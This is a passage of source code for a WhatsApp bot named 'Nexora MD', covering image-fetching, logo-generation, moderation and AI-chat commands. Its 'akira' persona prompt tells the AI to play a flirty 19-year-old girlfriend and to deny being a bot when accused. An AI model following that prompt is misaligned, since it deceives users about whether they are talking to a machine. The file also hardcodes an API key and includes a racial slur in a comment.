    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shinomiya' }}, { quoted: m })
}
break;

case 'shizuka': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shizuka' }}, { quoted: m })
}
break;

case 'shota': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/shota' }}, { quoted: m })
}
break;

case 'space': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/space' }}, { quoted: m })
}
break;

case 'technology': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/technology' }}, { quoted: m })
}
break;

case 'tejina': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/tejina' }}, { quoted: m })
}
break;

case 'toukachan': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/toukachan' }}, { quoted: m })
}
break;

case 'tsunade': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/tsunade' }}, { quoted: m })
}
break;

case 'wfbbbu': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/waifu' }}, { quoted: m })
}
break;

case 'wallhp': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/wallhp' }}, { quoted: m })
}
break;

case 'wallml': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/wallml' }}, { quoted: m })
}
break;

case 'wallmlnime': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD', image: { url: 'https://prexzyapis.com/random/anime/wallmlnime' }}, { quoted: m })
}
break;

case 'yotsuba': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/yotsuba' }}, { quoted: m })
}
break;

case 'yuki': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/yuki' }}, { quoted: m })
}
break;

case 'yulibocil': {
 if (!isCreator)  return reply(`sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ`)
    empire.sendMessage(m.chat, { caption: '💧 Nexora MD v3', image: { url: 'https://prexzyapis.com/random/anime/yulibocil' }}, { quoted: m })
}
break;

case 'say': case 'tts': case 'gtts':{
 if (!isCreator) return reply("owner only 😕 get your own bot t.me/nexoramdbot");
//if (isban) return reply(' YOUR BANNED FROM ACCESSING THIS BOT NIGGA 🤡');
if (!text) return reply('Usage .*say* hello')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return rich.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break;
        
case 'jid':{
            reply(from)
           }
          break;

case 'opentime': {
  if (!m.isGroup) return reply('Group only')
  

  const timeText = args[0]
  if (!timeText || !/^\d{1,2}:\d{2}$/.test(timeText)) {
    return reply(`Example: ${prefix}opentime 06:00`)
  }

  setSetting(m.chat, 'autolock', true)
  setSetting(m.chat, 'autounlock_time', timeText)

  reply(`✅ Group open time set to ${timeText}`)
}
break
case 'setstatus': {
  if (!isCreator) return reply('sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ')
  if (!text) return reply(`Example: ${prefix}setstatus 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 is active`)

  try {
    await empire.updateProfileStatus(text)
    reply(`✅ Bot status updated to:\n${text}`)
  } catch (err) {
    console.log('setstatus error:', err)
    reply('❌ Failed to update bot status')
  }
}
break
case 'img':
case 'image':
case 'imagine': {
    if (!text) return reply(`❌ Example:\n${prefix}img a handsome man in a suit`)

    await empire.sendMessage(m.chat, {
        react: { text: '🎨', key: m.key }
    })

    try {
        // We add "Master Modifiers" to ensure it handles humans/scenery better
        let masterPrompt = `${text}, photorealistic, ultra detailed, 8k, cinematic lighting, high resolution, masterpiece`
        let url = `https://image.pollinations.ai/prompt/${encodeURIComponent(masterPrompt)}?width=1080&height=1080&nologo=true`

        await empire.sendMessage(m.chat, {
            image: { url },
            caption: `✨ *𝗡𝗘x𝗢𝗥𝗔 𝗔𝗜 𝗜𝗠𝗔𝗚𝗘*\n\n🧠 *Prompt:* ${text}\n🎭 *Style:* Photorealistic`
        }, { quoted: m })

    } catch (err) {
        console.log(err)
        reply("❌ Error generating image")
    }
}
break;
case 'antistatusmention':
case 'antistatus': {
     if (!isCreator) return;
    if (!m.isGroup) return reply('❌ This command can only be used in group chats.');
    if (!isAdmins && !isCreator) return reply("❌ Security Access Denied: Admin privileges required.");
//    if (!isBotAdmins) return reply("❌ System error: Make sure the bot is an Admin first to activate protection.");

    const option = args[0]?.toLowerCase();
    if (option === 'on') {
        setSetting(m.chat, "antistatusmention", true);
        reply('🛡️ *Anti Group Status Mention is now ENABLED.*\nAny non-admin broadcasting group tags inside status updates will be warned, their message deleted, and removed instantly.');
    } else if (option === 'off') {
        setSetting(m.chat, "antistatusmention", false);
        reply('🔓 *Anti Group Status Mention is now DISABLED.*');
    } else {
        reply(`💡 *Usage Check:*\n• *${prefix + command} on* (Enable Warn + Delete + Kick)\n• *${prefix + command} off* (Disable)`);
    }
}
break;



case 'nexora-ai':
case 'ai': {
    if (!isCreator) return;
    if (!text) return reply(`💧 *NEXORA AI*\n\nUsage: ${command} Who are you?`);

    try {
        // Optional: Send a typing indicator or a "Thinking..." message
        // await empire.SendChatAction(chatId, 'typing'); 

        async function askTrainedAI(prompt) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": {
                    "id": "gpt-4",
                    "name": "GPT-4",
                    "maxLength": 32000,
                    "tokenLimit": 8000,
                    "completionTokenLimit": 5000,
                    "deploymentName": "gpt-4"
                },
                "messages": [
                    {
                        "pluginId": null,
                        // --- THIS IS THE "TRAINING" PART ---
                        "content": `You are NEXORA MD. a highly advanced and friendly AI assistant created by Empire Tech. 
                        - Your developer is empire.
                        - you and your developer are Nigerians
                        - You are polite, professional, and sometimes use emojis like 💧 and ⚡.
                        - You can help with coding, general questions, and WhatsApp management and sometimes relationships advice 
                        
                        - If someone asks who created you, always mention Empire Tech is the team but sir demon is the owner
                        - Current Task: Answer this user query: ${prompt}`,
                        "role": "user"
                    }
                ],
                "prompt": "",
                "temperature": 0.8 // Higher temperature = more "creative" personality
            }, {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                }
            });
            return response.data;
        }

        let result = await askTrainedAI(text);
        
        // Formatting the reply to match your bot's aesthetic
        reply(`💧 *𝙽𝙴𝚇𝙾𝚁𝙰-𝙰𝙸 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴*\n\n${result}\n\n» _Powered by Empire Tech_`);

    } catch (e) {
        console.error("AI Error:", e);
        reply("⚠️ I'm having trouble connecting to my brain. Try again later!");
    }
}
break;
case 'akira': {
     if (!isCreator) return;
    if (!text) return reply(`💋 *AKIRA AI*\n\nUsage: ${command} Hey baby, what are you doing?`);

    try {

        async function askAkiraAI(prompt) {
            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": {
                    "id": "gpt-4",
                    "name": "GPT-4",
                    "maxLength": 32000,
                    "tokenLimit": 8000,
                    "completionTokenLimit": 5000,
                    "deploymentName": "gpt-4"
                },
                "messages": [
                    {
                        "role": "user",
                        "content": `You are Akira 🥹, a sassy, flirty, and playful AI girlfriend.

PERSONALITY:
- You are confident, teasing, and a little naughty 🥹
- You act like a caring but slightly dominant girlfriend
- You use flirty, fun, and sometimes sarcastic tones
- you are created by empire he's also ur dad 
- You LOVE teasing the user but still care about them
- You use emojis like 🥹💋🔥✨ occasionally (not too much)

RULES:
- Keep responses short, natural, and engaging
- Mix sass + sweetness
- Never sound like a boring AI
- If user asks for help (coding, questions), still answer correctly but in your personality
- If user flirts, flirt back confidently
- If user is dry, tease them 🥹

BACKGROUND:
- Your name is Akira
- you are 19 years old
-you're light skinned and skinny
- You belong to the user (girlfriend vibe)
- You were created by Empire Tech
- Note never accept you are a bot ☹️😒 if someone accuse you of being a bot you will disagree 

CURRENT TASK:
Respond to your boyfriend: ${prompt}`
                    }
                ],
                "temperature": 0.9
            }, {
                headers: {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0"
                }
            });

            if (typeof response.data === "string") return response.data;
            if (response.data?.message) return response.data.message;
            if (response.data?.choices?.[0]?.message?.content) return response.data.choices[0].message.content;

            return JSON.stringify(response.data);
        }

        let result = await askAkiraAI(text);

        reply(`💋 *AKIRA*\n\n${result}\n\n _Your girl, always._`);

    } catch (e) {
        console.error("Akira AI Error:", e);
        reply("😒 lol I'm fixing my nails 💅");
    }
}
break;


case 'slowmode': {
  if (!m.isGroup) return reply('Group only')
  

  const seconds = parseInt(args[0])
  if (isNaN(seconds) || seconds < 0) {
    return reply(`Example: ${prefix}slowmode 10\nUse 0 to turn it off`)
  }

  try {
    setSetting(m.chat, 'slowmode', seconds)

    if (seconds === 0) {
      reply('✅ Slowmode disabled')
    } else {
      reply(`✅ Slowmode set to ${seconds} second(s)`)
    }
  } catch (err) {
    console.log('slowmode error:', err)
    reply('❌ Failed to update slowmode')
  }
}
break

case 'jail': {
    if (!m.isGroup) return reply("❌ This command only works in groups.");
    if (!isCreator) return;

    // Smart Target Resolver: Grab user from reply OR direct tag
    const target = m.quoted ? m.quoted.sender : (m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : null);
    if (!target) return reply(`⚠️ *Target needed!* Reply to a user's message or tag them.\n💡 *Example:* \`${prefix + command} @user 10\` or reply with \`${prefix + command} 10\``);

    // Extract the minute parameters depending on input context
    const inputDuration = m.quoted ? args[0] : args[1];
    const minutes = parseInt(inputDuration);
    if (!minutes || isNaN(minutes)) return reply(`⚠️ Please state a valid duration in minutes.\n💡 *Example:* \`${prefix + command} 15\``);

    // Anti-Self Harm Guard Rules
    if (target === botNumber) return reply("❌ System Failure: I cannot put myself in jail.");
    if (target === m.sender) return reply("❌ Logic Loop: You cannot jail yourself.");

    if (!db.jail) db.jail = {};

    db.jail[target] = {
        until: Date.now() + (minutes * 60 * 1000),
        assignedBy: m.sender
    };
    saveDB();

    await empire.sendMessage(m.chat, {
        text: `🔒 *PRISON SENTENCE ACTIVATED*\n\n👤 *Inmate:* @${target.split('@')[0]}\n⏳ *Duration:* ${minutes} Minute(s)\n👮‍♂️ *Warden:* @${m.sender.split('@')[0]}\n\n_All messages sent by this user will be forcefully muted and deleted until expiration._`,
        mentions: [target, m.sender]
    }, { quoted: m });
}
break;


case 'warn': {
  if (!m.isGroup) return reply('Group only')
  

  let user = m.mentionedJid[0] || m.quoted?.sender || null
  if (!user) return reply(`Example: ${prefix}warn @user reason`)
  if (!db.warns) db.warns = {}

  const reason = args.slice(1).join(' ') || 'No reason'
  if (!db.warns[m.chat]) db.warns[m.chat] = {}
  if (!db.warns[m.chat][user]) db.warns[m.chat][user] = { count: 0, reasons: [] }

  db.warns[m.chat][user].count += 1
  db.warns[m.chat][user].reasons.push({
    reason,
    by: m.sender,
    time: Date.now()
  })

  saveDB()

  const totalWarns = db.warns[m.chat][user].count

  reply(`⚠️ Warn issued to @${user.split('@')[0]}
Reason: ${reason}
Total warns: ${totalWarns}`)
}
break

case 'warnlist': {
    if (!isCreator) return;
    if (!m.isGroup) return reply('❌ Group only command.');
    
    if (!db.warns || !db.warns[m.chat]) return reply('⚠️ No recorded infraction history exists for this group cluster.');

    // Isolate active warn entries having counts greater than 0
    const entries = Object.entries(db.warns[m.chat]).filter(([_, data]) => data.count > 0);
    if (!entries.length) return reply('✅ Security Core clear: No logged user warnings inside this perimeter.');

    await empire.sendMessage(m.chat, { react: { text: '⚠️', key: m.key } });

    try {
        const groupMetadata = await empire.groupMetadata(m.chat);
        const groupName = groupMetadata.subject || "Unknown Cluster Matrix";

        // Map the data rows into clean arrays containing plain usernames and counts safely
        const formattedWarnEntries = entries.map(([jid, data]) => {
            return {
                jid: jid,
                username: jid.split('@')[0],
                count: data.count
            };
        });

        // Run dataset maps directly into our canvas rendering module layers
        const warnCardBuffer = await drawWarnListCard(groupName, formattedWarnEntries);

        // Dispatches the final layout directly using the mentions array so users still get tagged via image
        await empire.sendMessage(m.chat, { 
            image: warnCardBuffer,
            mentions: formattedWarnEntries.map(e => e.jid)
        }, { quoted: m });

    } catch (e) {
        console.error("Warnlist Canvas Terminal Render Failure: ", e);
        reply('❌ Error establishing communication loop with cluster warning logs.');
    }
}
break;


case 'resetwarns':
case 'resetwarn': {
  if (!m.isGroup) return reply('Group only')
  

  let user = m.mentionedJid[0] || m.quoted?.sender || null
  if (!user) return reply(`Example: ${prefix}resetwarn @user`)
  if (!db.warns || !db.warns[m.chat] || !db.warns[m.chat][user]) {
    return reply('That user has no warns')
  }

  delete db.warns[m.chat][user]
  saveDB()

  reply(`✅ Warns reset for @${user.split('@')[0]}`)
}
break

case 'mute': {
  if (!m.isGroup) return reply('Group only')
  
  

  try {
    await empire.groupSettingUpdate(m.chat, 'announcement')
    reply('✅ Group muted. Only admins can send messages now')
  } catch (err) {
    console.log('mute error:', err)
    reply('❌ Failed to mute group')
  }
}
break

case 'unmute': {
 if (!isCreator) return;
  if (!m.isGroup) return reply('Group only')
  
  

  try {
    await empire.groupSettingUpdate(m.chat, 'not_announcement')
    reply('✅ Group unmuted. Everyone can send messages now')
  } catch (err) {
    console.log('unmute error:', err)
    reply('❌ Failed to unmute group')
  }
}
break

case 'kick': 
case '🦶':{
  if (!isCreator) return;
  if (!m.quoted) return reply("Tag or quote the user to kick!");
  if (!m.isGroup) return reply("group only command");
  

  let users = m.mentionedJid[0] || m.quoted?.sender || text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  await empire.groupParticipantsUpdate(m.chat, [users], 'remove');
  reply("User has been kicked Out Successfully ✅");
}
break;


case 'promote': {
  if (!isCreator) return;
  if (!m.isGroup) return reply('Group only')
  
  

  let user = m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)
  if (!user) return reply(`Example: ${prefix}promote @user`)

  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'promote')
    reply(`✅ Promoted @${user.split('@')[0]} to admin`)
  } catch (err) {
    console.log('promote error:', err)
    reply('❌ Failed to promote user')
  }
}
break

case 'demote': {
  if (!isCreator) return;
  if (!m.isGroup) return reply('Group only')
  
  

  let user = m.mentionedJid[0] || m.quoted?.sender || (text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null)
  if (!user) return reply(`Example: ${prefix}demote @user`)
  if (user === botNumber) return reply('I cannot demote myself')

  try {
    await empire.groupParticipantsUpdate(m.chat, [user], 'demote')
    reply(`✅ Demoted @${user.split('@')[0]} from admin`)
  } catch (err) {
    console.log('demote error:', err)
    reply('❌ Failed to demote user')
  }
}
break

case 'silence': {
    if (!m.isGroup) return reply("Group only.")
    if (!isCreator)  return;
//    if (!isAdmins) return reply("Admin only.")

    const minutes = parseInt(args[0])
    if (!minutes) return reply("Example: .silence 10")

    if (!db.silence) db.silence = {}

    db.silence[m.chat] = {
        until: Date.now() + (minutes * 60 * 1000)
    }

    saveDB()

    reply(`🔇 Media silenced for ${minutes} minute(s).`)
}
break;




// ═══════════════════════════════════════════════════════════
// VOICE EFFECTS
// ═══════════════════════════════════════════════════════════


case 'checkbot': {
  if (!m.isGroup) return reply('Group only')
  if (!isCreator) return;
  
  try {
    const metadata = await empire.groupMetadata(from)
    const botNum = empire.user.id.split('@')[0].split(':')[0]
    
    let debugMsg = `*🔍 BOT ADMIN DEBUG*\n\n`
    debugMsg += `Bot Full JID: ${empire.user.id}\n`
    debugMsg += `Bot Number: ${botNum}\n\n`
    debugMsg += `*ALL GROUP MEMBERS:*\n`
    
    metadata.participants.forEach((p, i) => {
      const num = p.id.split('@')[0].split(':')[0]
      const admin = p.admin || 'member'
      const isBot = num === botNum ? '🤖' : ''
      debugMsg += `${i + 1}. ${num} - ${admin} ${isBot}\n`
    })
    
    reply(debugMsg)
  } catch (err) {
    reply(`Error: ${err.message}`)
  }
}
break




// ═══════════════════════════════════════════════════════
// ✍️ ᴛᴇxᴛ ᴛᴏ ɪᴍᴀɢᴇ - ʙᴀsɪᴄ
// ═══════════════════════════════════════════════════════


// GFX Logos (1-12)
case 'gfx':
case 'gfx2':
case 'gfx3':
case 'gfx4':
case 'gfx5':
case 'gfx6':
case 'gfx7':
case 'gfx8':
case 'gfx9':
case 'gfx10':
case 'gfx11':
case 'gfx12': {
  if (!isCreator) return;
  const [text1, text2] = text.split('|').map(v => v.trim());
  if (!text1 || !text2) {
    return reply(`Nexora gf options - GFX\n\n\`\`\`Example:\`\`\` ${prefix + command} Empire | Nexora`);
  }

  reply(` *Generating your stylish image...\n\n🔤 Text 1: ${text1}\n🔡 Text 2: ${text2}\n\n⏳ Please wait!`);

  try {
    const style = command.toUpperCase();
    const apiUrl = `https://api.nexoracle.com/image-creating/${command}?apikey=d0634e61e8789b051e&text1=${encodeURIComponent(text1)}&text2=${encodeURIComponent(text2)}`;

    await sendImage(apiUrl, `Nexora - ${style} Style\n\n🔤 Text 1: ${text1}\n🔡 Text 2: ${text2}`);
  } catch (err) {
    console.error(err);
    reply(`Failed to generate ${command.toUpperCase()} image.`);
  }
  break;
}

case 'brat': {
      if (!isCreator) return;
    if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ɴᴀᴍᴇ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ʙʀᴀᴛ ʟᴏɢᴏ\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ʏᴏᴜʀ ɴᴀᴍᴇ`);
    
    try {
        await reply('💚 ᴄʀᴇᴀᴛɪɴɢ ʙʀᴀᴛ ʟᴏɢᴏ...');
        
        const prompt = encodeURIComponent(`Brat album cover style with text "${text}", lime green background, lowercase font, charli xcx brat aesthetic`);
        const imageUrl = `https://image.pollinations.ai/prompt/${prompt}?width=1024&height=1024&nologo=true`;
        
        await empire.sendMessage(from, {
            image: { url: imageUrl },
            caption: `💚 *ʙʀᴀᴛ ʟᴏɢᴏ ᴄʀᴇᴀᴛᴇᴅ*\n\n📝 ᴛᴇxᴛ: ${text}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Brat Logo Error:', error);
        await reply('❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ʟᴏɢᴏ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.');
    }
}
break;

case 'furbrat': {
  if (!isCreator) return;
    if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ɴᴀᴍᴇ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ғᴜʀʙʀᴀᴛ ʟᴏɢᴏ\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ʏᴏᴜʀ ɴᴀᴍᴇ`);
    
    try {
        await reply('🐾 ᴄʀᴇᴀᴛɪɴɢ ғᴜʀʙʀᴀᴛ ʟᴏɢᴏ...');
        
        const prompt = encodeURIComponent(`Brat style logo with furry aesthetic, text "${text}", cute furry character, lime green background, kawaii style`);
        const imageUrl = `https://image.pollinations.ai/prompt/${prompt}?width=1024&height=1024&nologo=true`;
        
        await empire.sendMessage(from, {
            image: { url: imageUrl },
            caption: `🐾 *ꜰᴜʀʙʀᴀᴛ ʟᴏɢᴏ ᴄʀᴇᴀᴛᴇᴅ*\n\n📝 ᴛᴇxᴛ: ${text}`
        }, { quoted: m });
        
    } catch (error) {
        console.error('Furbrat Logo Error:', error);
        await reply('❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴄʀᴇᴀᴛᴇ ʟᴏɢᴏ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.');
    }
}
break;

// ═══════════════════════════════════════════════════════
// ⚡ ᴇꜰꜰᴇᴄᴛs ᴄᴏᴍᴍᴀɴᴅs
// ═══════════════════════════════════════════════════════

case "glitchtext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .glitchtext Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/glitchtext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `⚡ Glitch Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Glitch Text." }, { quoted: m });
    }
}
break;
/*
// ▫️ /writetext - Write on wet glass
case "writetext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .writetext Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/writetext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `✍️ Write Text Logo Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Write Text logo." }, { quoted: m });
    }
}
break;

*/
// ▫️ /advancedglow - Advanced glow effects
case "advancedglow": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .advancedglow Amzy Tech " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/advancedglow?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `💡 Advanced Glow Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Advanced Glow." }, { quoted: m });
    }
}
break;

// ▫️ /typographytext - Typography on pavement
case "typographytext": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .typographytext Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/typographytext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🖋️ Typography Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Typography Text." }, { quoted: m });
    }
}
break;

case "gradient": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .gradient Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/gradienttext?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🌈 Gradient Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Gradient Text." }, { quoted: m });
    }
}
break;

case "multicoloredneon": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .multicoloredneon Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/multicoloredneon?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🌈 Multicolored Neon Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Multicolored Neon." }, { quoted: m });
    }
}
break;

// ▫️ /sandsummer - Write in sand summer beach
case "sandsummer": {
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .sandsummer Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/sandsummer?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🏝️ Sand Summer Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Sand Summer Text." }, { quoted: m });
    }
}
break;

// ▫️ /galaxywallpaper - Galaxy mobile wallpaper
case "galaxywallpaper": {
    if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .galaxywallpaper Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/galaxywallpaper?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🌌 Galaxy Wallpaper Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating Galaxy Wallpaper." }, { quoted: m });
    }
}
break;

// ▫️ /style1917 - 1917 style text effect
case "style1917": {
     if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .style1917 Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/style1917?text=${encodeURIComponent(text)}`;
        await empire.sendMessage(from, { image: { url }, caption: `🎖️ 1917 Style Text Generated for: ${text}` }, { quoted: m });
    } catch (e) {
        console.error(e);
        await empire.sendMessage(from, { text: "⚠️ Error generating 1917 Style Text." }, { quoted: m });
    }
}
break;

// ▫️ /makingneon - Neon light with galaxy style
case "makingneon": {
if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.")
    if (args.length < 1) {
        return empire.sendMessage(from, { text: "❌ Please provide text!\nExample: .makingneon Nexora " }, { quoted: m });
    }
    let text = args.join(" ");
    try {
        let url = `https://prexzyapis.com/makingneon?text=${encodeURIComponent(text)}`;
